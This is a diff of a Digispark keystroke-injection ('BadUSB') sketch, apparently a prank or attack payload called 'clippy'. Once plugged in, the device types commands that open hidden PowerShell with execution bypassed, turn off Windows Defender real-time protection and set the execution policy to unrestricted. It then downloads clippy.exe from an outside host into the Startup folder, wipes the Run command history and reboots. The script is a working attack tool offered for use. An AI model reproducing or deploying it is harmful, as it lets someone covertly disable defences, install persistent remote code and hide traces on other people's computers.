@@ -25,31 +25,39 @@ Please see "clippy.txt" for list of phrases.
 
  #include "DigiKeyboard.h"
  /* Init function */
+
     void setup() {
       // Don't need to set anything up to use DigiKeyboard
     }
+
     void loop() {
-     // Turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
-     pinMode(1, OUTPUT); //LED on Model A
-     digitalWrite(1, HIGH);
-     DigiKeyboard.delay(500);
-     digitalWrite(1, LOW);
-     DigiKeyboard.delay(100);
-     DigiKeyboard.sendKeyStroke(0);
-     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Opens up "RUN" again
-     DigiKeyboard.delay(100);
-     //DigiKeyboard.println(F("powershell")); // To see whats going on in powershell - uncomment to use WARNING: WILL NOT RUN ADMINISTRATOR MODE
-     DigiKeyboard.println(F("powershell -NoP -NonI -W Hidden -Exec Bypass")); // Launches Powershell hidden - uncomment to use  
-     DigiKeyboard.delay(2000);
-     // Disable Windows Defender
+      // Turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
+      pinMode(1, OUTPUT); //LED on Model A
+      digitalWrite(1, HIGH);
+      DigiKeyboard.delay(500);
+      digitalWrite(1, LOW);
+      DigiKeyboard.delay(100);
+      DigiKeyboard.sendKeyStroke(0);
+      // Runing powershell through "RUN" with admin privlages, turn off windows defender, and set powerscript execution policy
+      DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Opens up "RUN"
+      DigiKeyboard.delay(100);
+      // Runing powershell
+      //DigiKeyboard.println(F("powershell")); // To see whats going on in powershell - uncomment to use WARNING: WILL NOT RUN ADMINISTRATOR MODE
+      DigiKeyboard.println(F("powershell -NoP -NonI -W Hidden -Exec Bypass")); // Launches Powershell hidden - uncomment to use  
+      DigiKeyboard.delay(2000);
+      // Disable Windows Defender
       DigiKeyboard.println(F("Set-MpPreference -DisableRealtimeMonitoring $true"));
       DigiKeyboard.delay(100);
-      DigiKeyboard.println(F("set-executionpolicy unrestricted")); // Unrestricted
+      // Allow scripts from interwebs to run (.ps1)
+      DigiKeyboard.println(F("set-executionpolicy unrestricted"));
       DigiKeyboard.delay(100);
-      DigiKeyboard.println(F("Y")); // Accept
+      // Accept
+      DigiKeyboard.println(F("Y"));
+      DigiKeyboard.delay(100);
+      DigiKeyboard.sendKeyStroke(KEY_ENTER);
       DigiKeyboard.delay(100);
       // Execute code from the interwebs modify 000.0.0.0 with your IP address (192.168.0.0, 127.0.0.1, etc.)
-      DigiKeyboard.println(F("$StartupDir = [environment]::getfolderpath('Startup');cd $StartupDir;mkdir clippy;cd clippy;Invoke-WebRequest \"http://000.0.0.0/clippy.exe\" -OutFile \"clippy.exe\";Invoke-WebRequest \"http://000.0.0.0/clippy.txt\" -OutFile \"clippy.txt\";Invoke-WebRequest \"http://000.0.0.0/clippy.vbs\" -OutFile \"clippy.vbs\""));
+      DigiKeyboard.println(F("$StartupDir = [environment]::getfolderpath('Startup');cd $StartupDir;Invoke-WebRequest \"http://Dataducks.3utilities.com/download/clippy.exe\" -OutFile \"clippy.exe\";Invoke-WebRequest \"http://dataducks.3utilities.com/download/clippy.txt\" -OutFile \"clippy.txt\""));
       DigiKeyboard.delay(100);
       DigiKeyboard.sendKeyStroke(KEY_ENTER);
       DigiKeyboard.delay(100);
@@ -58,11 +66,6 @@ Please see "clippy.txt" for list of phrases.
       DigiKeyboard.delay(100);
       DigiKeyboard.sendKeyStroke(KEY_ENTER);
       DigiKeyboard.delay(100);
-      // Execute clippy.txt
-      DigiKeyboard.println(F("./clippy.vbs"));
-      DigiKeyboard.delay(100);
-      DigiKeyboard.sendKeyStroke(KEY_ENTER);
-      DigiKeyboard.delay(1000);
       // Clear run command history
       DigiKeyboard.println(F("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f"));
       DigiKeyboard.delay(100);
@@ -72,7 +75,6 @@ Please see "clippy.txt" for list of phrases.
       digitalWrite(1, HIGH);
       // Restart computer payload will execute on startup ($StartupDir = [environment]::getfolderpath('Startup'))
       DigiKeyboard.println(F("Restart-Computer"));
-      DigiKeyboard.sendKeyStroke(KEY_ENTER);
   
       while(true){
         //do nothing
